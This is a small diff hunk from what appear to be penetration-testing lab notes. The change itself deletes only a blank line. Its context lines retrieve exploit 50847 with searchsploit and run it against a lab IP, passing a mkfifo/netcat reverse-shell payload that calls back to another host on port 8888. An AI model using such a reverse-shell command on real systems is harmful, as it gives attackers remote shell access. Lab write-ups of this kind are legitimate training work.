@@ -260,7 +260,6 @@ searchsploit -m 50847
 python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.185 8888>/tmp/f'
 
 
-
 ```
 ### Hetemit
 ```shell
